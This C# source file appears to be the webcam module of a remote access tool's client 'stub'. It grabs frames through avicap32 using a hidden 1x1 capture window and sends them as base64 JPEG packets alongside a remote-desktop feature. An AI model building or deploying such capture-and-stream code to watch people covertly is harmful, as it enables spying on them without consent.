using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace SeroStub;

// VFW (avicap32.dll) webcam fallback — pure P/Invoke, NativeAOT-compatible.
// No AForge, no COM, no System.Windows.Forms dependency.
// [UnmanagedCallersOnly] is used for the frame callback instead of delegates.
internal static class WebcamDShow
{
    static volatile bool _running;
    static Thread? _thread;
    static byte[] s_frameBuf = new byte[512 * 1024]; // grow-only; written by FrameCallback
    static int    s_frameLen;

    public static void Start(string deviceSymlink, int deviceIndex, int quality, int fps,
                             Func<int, string, Task> send,
                             Action<string> sendLog,
                             Action<string> sendError)
    {
        Stop();
        _running = true;
        _thread = new Thread(() => CaptureLoop(deviceIndex, quality, fps, send, sendLog, sendError))
        {
            IsBackground = true,
            Name = "WcamDShow"
        };
        _thread.SetApartmentState(ApartmentState.STA);
        _thread.Start();
    }

    public static void Stop()
    {
        _running = false;
        _thread?.Join(3000);
        _thread = null;
    }

    // ── P/Invoke ──────────────────────────────────────────────────────────────────

    [DllImport("avicap32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr capCreateCaptureWindowW(string title, uint style,
                                                  int x, int y, int w, int h,
                                                  IntPtr parent, int id);
    [DllImport("user32.dll")]
    static extern IntPtr SendMessage(IntPtr hwnd, uint msg, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")]
    static extern bool DestroyWindow(IntPtr hwnd);
    [DllImport("gdiplus.dll")]
    static extern int GdipCreateBitmapFromScan0(int w, int h, int stride, int fmt,
                                                 IntPtr scan0, out IntPtr bmp);
    [DllImport("gdiplus.dll")]
    static extern int GdipDisposeImage(IntPtr img);

    // ── WM_CAP_* constants ────────────────────────────────────────────────────────

    const uint WM_CAP_SET_CALLBACK_FRAME = 0x0400 + 5;
    const uint WM_CAP_DRIVER_CONNECT     = 0x0400 + 10;
    const uint WM_CAP_DRIVER_DISCONNECT  = 0x0400 + 11;
    const uint WM_CAP_GET_VIDEOFORMAT    = 0x0400 + 44;
    const uint WM_CAP_SET_VIDEOFORMAT    = 0x0400 + 45;
    const uint WM_CAP_GRAB_FRAME_NOSTOP  = 0x0400 + 61;
    const uint WS_POPUP                  = 0x80000000;

    // ── Structs ───────────────────────────────────────────────────────────────────

    [StructLayout(LayoutKind.Sequential)]
    struct VIDEOHDR
    {
        public IntPtr lpData;
        public uint   dwBufferLength, dwBytesUsed, dwTimeCaptured, dwUser, dwFlags;
        public IntPtr r0, r1, r2, r3;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct BITMAPINFOHEADER
    {
        public int   biSize, biWidth, biHeight;
        public short biPlanes, biBitCount;
        public uint  biCompression, biSizeImage;
        public int   biXPelsPerMeter, biYPelsPerMeter;
        public uint  biClrUsed, biClrImportant;
    }

    // ── Frame callback ────────────────────────────────────────────────────────────

    // [UnmanagedCallersOnly] = NativeAOT-safe native callback, no COM callable wrapper needed.
    // Called synchronously by SendMessage(WM_CAP_GRAB_FRAME_NOSTOP) on the same thread.
    [UnmanagedCallersOnly]
    static IntPtr FrameCallback(IntPtr hwnd, IntPtr pVHdr)
    {
        var hdr = Marshal.PtrToStructure<VIDEOHDR>(pVHdr);
        if (hdr.lpData != IntPtr.Zero && hdr.dwBytesUsed > 0)
        {
            int len = (int)hdr.dwBytesUsed;
            if (s_frameBuf.Length < len) s_frameBuf = new byte[len];
            Marshal.Copy(hdr.lpData, s_frameBuf, 0, len);
            s_frameLen = len;
        }
        return IntPtr.Zero;
    }

    // ── Capture loop ──────────────────────────────────────────────────────────────

    // MJPG fourcc as little-endian uint32: 'M'=0x4D 'J'=0x4A 'P'=0x50 'G'=0x47
    const uint FOURCC_MJPG = 0x47504A4D;

    static void CaptureLoop(int deviceIndex, int quality, int fps,
                             Func<int, string, Task> send, Action<string> sendLog, Action<string> sendError)
    {
        IntPtr hwnd = IntPtr.Zero;
        int W = 640, H = 480;
        bool bottomUp = true;
        bool isMjpeg  = false;

        try
        {
            RemoteDesktopFeature.EnsureGdiplusPublic();

            hwnd = capCreateCaptureWindowW("cap", WS_POPUP, 0, 0, 1, 1, IntPtr.Zero, 0);
            if (hwnd == IntPtr.Zero) { sendError("VFW: capCreateCaptureWindowW failed"); return; }

            if (SendMessage(hwnd, WM_CAP_DRIVER_CONNECT, (IntPtr)deviceIndex, IntPtr.Zero) == IntPtr.Zero)
            { sendError($"VFW: connect device {deviceIndex} failed"); return; }
            sendLog($"VFW: connected device {deviceIndex}");

            // Try to negotiate MJPG first (native to most webcams, lower CPU)
            var bmiMjpg = new BITMAPINFOHEADER
            {
                biSize = Marshal.SizeOf<BITMAPINFOHEADER>(),
                biWidth = 640, biHeight = 480,
                biPlanes = 1, biBitCount = 24,
                biCompression = FOURCC_MJPG
            };
            IntPtr pBmiMjpg = Marshal.AllocHGlobal(Marshal.SizeOf<BITMAPINFOHEADER>());
            Marshal.StructureToPtr(bmiMjpg, pBmiMjpg, false);
            SendMessage(hwnd, WM_CAP_SET_VIDEOFORMAT, (IntPtr)Marshal.SizeOf<BITMAPINFOHEADER>(), pBmiMjpg);
            Marshal.FreeHGlobal(pBmiMjpg);

            // Read back the negotiated format
            IntPtr pBmi = Marshal.AllocHGlobal(256);
            try
            {
            if (SendMessage(hwnd, WM_CAP_GET_VIDEOFORMAT, (IntPtr)256, pBmi) != IntPtr.Zero)
            {
                var bh = Marshal.PtrToStructure<BITMAPINFOHEADER>(pBmi);
                W        = bh.biWidth;
                H        = Math.Abs(bh.biHeight);
                bottomUp = bh.biHeight > 0;
                isMjpeg  = bh.biCompression == FOURCC_MJPG;
                sendLog($"VFW: {W}x{H} bpp={bh.biBitCount} comp=0x{bh.biCompression:X} isMjpeg={isMjpeg}");

                // If driver didn't accept MJPG, fall back to requesting RGB24
                if (!isMjpeg && bh.biCompression != 0)
                {
                    Marshal.FreeHGlobal(pBmi);
                    pBmi = IntPtr.Zero;
                    var bmiRgb = new BITMAPINFOHEADER
                    {
                        biSize = Marshal.SizeOf<BITMAPINFOHEADER>(),
                        biWidth = 640, biHeight = 480,
                        biPlanes = 1, biBitCount = 24,
                        biCompression = 0
                    };
                    bmiRgb.biSizeImage = (uint)(640 * 480 * 3);
                    IntPtr pBmiRgb = Marshal.AllocHGlobal(Marshal.SizeOf<BITMAPINFOHEADER>());
                    Marshal.StructureToPtr(bmiRgb, pBmiRgb, false);
                    SendMessage(hwnd, WM_CAP_SET_VIDEOFORMAT, (IntPtr)Marshal.SizeOf<BITMAPINFOHEADER>(), pBmiRgb);
                    Marshal.FreeHGlobal(pBmiRgb);

                    pBmi = Marshal.AllocHGlobal(256);
                    if (SendMessage(hwnd, WM_CAP_GET_VIDEOFORMAT, (IntPtr)256, pBmi) != IntPtr.Zero)
                    {
                        var bh2 = Marshal.PtrToStructure<BITMAPINFOHEADER>(pBmi);
                        W        = bh2.biWidth;
                        H        = Math.Abs(bh2.biHeight);
                        bottomUp = bh2.biHeight > 0;
                        isMjpeg  = bh2.biCompression == FOURCC_MJPG;
                        sendLog($"VFW fallback: {W}x{H} bpp={bh2.biBitCount} comp=0x{bh2.biCompression:X}");
                        if (bh2.biCompression != 0 && !isMjpeg)
                        {
                            Marshal.FreeHGlobal(pBmi);
                            pBmi = IntPtr.Zero;
                            sendError($"VFW: unsupported format comp=0x{bh2.biCompression:X}");
                            return;
                        }
                    }
                }
            }
            else { sendLog("VFW: GET_VIDEOFORMAT failed, assuming 640x480 RGB24"); }
            }
            finally { if (pBmi != IntPtr.Zero) Marshal.FreeHGlobal(pBmi); }

            // Register callback via function pointer — NativeAOT-safe, no delegate marshaling
            unsafe
            {
                delegate* unmanaged<IntPtr, IntPtr, IntPtr> fp = &FrameCallback;
                SendMessage(hwnd, WM_CAP_SET_CALLBACK_FRAME, IntPtr.Zero, (IntPtr)fp);
            }

            sendLog($"VFW: streaming OK mode={(isMjpeg ? "MJPG" : "RGB24")}");

            int intervalMs = Math.Max(1000 / Math.Max(fps, 1), 33);
            long lastMs    = 0;

            while (_running)
            {
                Thread.Sleep(Math.Max(intervalMs / 2, 20));
                if (!_running) break;

                long now = Environment.TickCount64;
                if (now - lastMs < intervalMs) continue;

                s_frameLen = 0;
                // Grab one frame — calls FrameCallback synchronously, then returns
                SendMessage(hwnd, WM_CAP_GRAB_FRAME_NOSTOP, IntPtr.Zero, IntPtr.Zero);

                if (s_frameLen == 0) continue;

                lastMs = now;

                string? b64;
                if (isMjpeg)
                {
                    // MJPG frames are already valid JPEG — base64 directly from grow-only buffer
                    b64 = Convert.ToBase64String(s_frameBuf, 0, s_frameLen);
                }
                else
                {
                    var jpeg = RgbToJpeg(s_frameBuf, s_frameLen, W, H, quality, bottomUp);
                    b64 = jpeg is { Length: > 0 } ? RemoteDesktopFeature.ToBase64(jpeg) : null;
                }

                if (b64 != null)
                {
                    var json = $"{{\"w\":{W},\"h\":{H},\"j\":\"{b64}\"}}";
                    _ = send((int)PacketType.WcamFrame, json);
                }
            }
        }
        catch (Exception ex)
        {
            sendLog($"VFW ex: {ex.GetType().Name}: {ex.Message}");
            sendError("VFW capture failed.");
        }
        finally
        {
            if (hwnd != IntPtr.Zero)
            {
                try { SendMessage(hwnd, WM_CAP_SET_CALLBACK_FRAME, IntPtr.Zero, IntPtr.Zero); } catch { }
                try { SendMessage(hwnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero); } catch { }
                try { DestroyWindow(hwnd); } catch { }
            }
        }
    }

    // ── BGR DIB → JPEG via GDI+ ───────────────────────────────────────────────────

    static byte[]? RgbToJpeg(byte[] data, int dataLen, int w, int h, int quality, bool bottomUp)
    {
        IntPtr pData = Marshal.AllocHGlobal(dataLen);
        try
        {
            Marshal.Copy(data, 0, pData, dataLen);
            int    stride    = w * 3;
            IntPtr scan0     = bottomUp ? IntPtr.Add(pData, (h - 1) * stride) : pData;
            int    bmpStride = bottomUp ? -stride : stride;
            const int Fmt24bppRgb = 0x00021808;
            if (GdipCreateBitmapFromScan0(w, h, bmpStride, Fmt24bppRgb, scan0, out IntPtr bmp) != 0
                || bmp == IntPtr.Zero) return null;
            try   { return RemoteDesktopFeature.GdipBitmapToJpeg(bmp, quality); }
            finally { GdipDisposeImage(bmp); }
        }
        finally { Marshal.FreeHGlobal(pData); }
    }
}
